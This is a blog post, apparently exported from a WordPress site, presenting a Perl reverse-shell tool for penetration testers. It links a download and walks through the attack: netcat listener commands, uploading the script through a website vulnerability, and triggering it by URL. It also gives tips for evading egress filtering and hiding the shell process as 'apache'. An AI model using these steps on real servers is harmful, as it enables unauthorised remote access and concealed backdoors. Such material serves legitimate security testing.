{"id":110,"date":"2007-05-26T16:44:29","date_gmt":"2007-05-26T16:44:29","guid":{"rendered":"http:\/\/pentestmonkey.net\/?p=110"},"modified":"2011-08-20T16:04:46","modified_gmt":"2011-08-20T16:04:46","slug":"perl-reverse-shell","status":"publish","type":"post","link":"https:\/\/pentestmonkey.net\/tools\/web-shells\/perl-reverse-shell","title":{"rendered":"perl-reverse-shell"},"content":{"rendered":"<p>This tool is designed for those situations during a pentest where you have upload access to a webserver that&#8217;s running PERL.\u00a0 Upload this script to somewhere in the web root then run it by accessing the appropriate URL in your browser.\u00a0 The script will open an outbound TCP connection from the webserver to a host and port of your choice.\u00a0 Bound to this TCP connection will be a shell.<\/p>\n<p>This will be a proper interactive shell in which you can run interective programs like telnet, ssh and su.\u00a0 It differs from web form-based shell which allow you to send a single command, then return you the output.<br \/>\n<!--more--><\/p>\n<h2>Download<\/h2>\n<p><a href=\"http:\/\/pentestmonkey.net\/tools\/perl-reverse-shell\/perl-reverse-shell-1.0.tar.gz\">perl-reverse-shell-1.0.tar.gz<\/a><\/p>\n<p>MD51sum: 1b38db18c1b168573afb8eeabbd8157b<br \/>\nSHA1sum: b2dfefd3d10f5fedd674a8651e5bdcb3b3289335<\/p>\n<h2>Walk Through<\/h2>\n<h3>Modify the source<\/h3>\n<p>To prevent some else from abusing your backdoor &#8211; a nightmare scenario while pentesting &#8211; you need to modify the source code to indicate where you want the reverse shell thrown back to.\u00a0 Edit the following lines of perl-reverse-shell.pl:<\/p>\n<pre># Where to send the reverse shell.\u00a0 Change these.<\/pre>\n<pre>my $ip = '127.0.0.1';<\/pre>\n<pre>my $port = 1234;<\/pre>\n<h3>Get Ready to catch the reverse shell<\/h3>\n<p>Start a TCP listener on a host and port that will be accessible by the web server.\u00a0 Use the same port here as you specified in the script (1234 in this example):<\/p>\n<pre>$ nc -v -n -l -p 1234<\/pre>\n<h3>Upload and Run the script<\/h3>\n<p>Using whatever vulnerability you&#8217;ve discovered in the website, upload perl-reverse-shell.pl.\u00a0 You&#8217;ll need to place it in a directory where PERL scripts can be run from (e.g. cgi-bin).\u00a0 Run the script simply by browsing to the newly uploaded file in your web browser:<\/p>\n<pre>http:\/\/somesite\/cgi-bin\/perl-reverse-shell.pl<\/pre>\n<h3>Enjoy your new shell<\/h3>\n<p>If all went well, the web server should have thrown back a shell to your netcat listener.\u00a0 Some useful commans such as w, uname -a, id and pwd are run automatically for you:<\/p>\n<pre>$ nc -v -n -l -p 1234\r\nlistening on [any] 1234 ...\r\nconnect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 58034\r\n\u00a016:35:52 up 39 days, 19:30,\u00a0 2 users,\u00a0 load average: 0.22, 0.20, 0.14\r\nUSER\u00a0\u00a0\u00a0\u00a0 TTY\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 LOGIN@\u00a0\u00a0 IDLE\u00a0\u00a0 JCPU\u00a0\u00a0 PCPU WHAT\r\nroot \u00a0 :0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 19May07 ?xdm?\u00a0\u00a0 5:07m\u00a0 0.01s \/bin\/sh \/usr\/kde\/3.5\/bin\/startk\r\nLinux somehost 2.6.19-gentoo-r5 #1 SMP PREEMPT Sun Apr 1 16:49:38 BST 2007 x86_64 AMD Athlon(tm) 64 X2 Dual Core Processor 4200+ AuthenticAMD GNU\/Linux\r\nuid=81(apache) gid=81(apache) groups=81(apache)\r\n\/\r\napache@somehost \/ $<\/pre>\n<h2>FAQs<\/h2>\n<h3>When is this useful?<\/h3>\n<p>Perhaps the only areas on disk that you have write access to are mounted with the &#8220;noexec&#8221; option.\u00a0 Uploading a compiled program will be of no use in these situations.\u00a0 You need to use an installed scripting language like Python, PERL, PHP, etc.<br \/>\nPerhaps you just can&#8217;t be bothered to upload a second program.<\/p>\n<h3>Isn&#8217;t the shell connection just going to be severed when the web server times out the PERL script?<\/h3>\n<p>No.\u00a0 It doesn&#8217;t seem to on the systems that I&#8217;ve tested it on (Gentoo Linux only so far).\u00a0 Additionally the PERL script attempts to daemonise itself and dissociate from the parent process to avoid this.<\/p>\n<h3>Isn&#8217;t there going to be a rather suspicious looking shell process when the admin runs &#8220;ps&#8221;?<\/h3>\n<p>Kinda.\u00a0 The number of processes has been minimised by using &#8220;exec&#8221; instead of &#8220;system&#8221;.\u00a0 The &#8220;\/bin\/sh -i&#8221; process will be seen in the process listing but can be renamed.\u00a0 By default \/bin\/sh will be renamed to \/usr\/sbin\/apache, so the process listing looks like<\/p>\n<pre>apache\u00a0\u00a0\u00a0 5289\u00a0 0.0\u00a0 0.0\u00a0\u00a0 2840\u00a0 1464 ?\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Ss\u00a0\u00a0 15:31\u00a0\u00a0 0:00 \/usr\/sbin\/apache -i<\/pre>\n<h2>Caveats<\/h2>\n<p>Outbound firewalling (aka egress filtering) may prevent your reverse shell connection reaching you.\u00a0 Pick a port that&#8217;s allowed through Firewall.\u00a0 If there are none, you&#8217;ll have to make do with a form-based PHP shell.<\/p>\n<p>This particular implementation of the reverse shell is unix-based.\u00a0 You&#8217;ll need to modify it before it will work on windows.<\/p>\n","protected":false},"excerpt":{"rendered":"<p>This tool is designed for those situations during a pentest where you have upload access to a webserver that&#8217;s running PERL.\u00a0 Upload this script to somewhere in the web root then run it by accessing the appropriate URL in your browser.\u00a0 The script will open an outbound TCP connection from the webserver to a host [&hellip;]<\/p>\n","protected":false},"author":3,"featured_media":0,"comment_status":"open","ping_status":"open","sticky":false,"template":"","format":"standard","meta":[],"categories":[15],"tags":[19,47,56],"_links":{"self":[{"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/posts\/110"}],"collection":[{"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/posts"}],"about":[{"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/types\/post"}],"author":[{"embeddable":true,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/users\/3"}],"replies":[{"embeddable":true,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/comments?post=110"}],"version-history":[{"count":2,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/posts\/110\/revisions"}],"predecessor-version":[{"id":444,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/posts\/110\/revisions\/444"}],"wp:attachment":[{"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/media?parent=110"}],"wp:term":[{"taxonomy":"category","embeddable":true,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/categories?post=110"},{"taxonomy":"post_tag","embeddable":true,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/tags?post=110"}],"curies":[{"name":"wp","href":"https:\/\/api.w.org\/{rel}","templated":true}]}}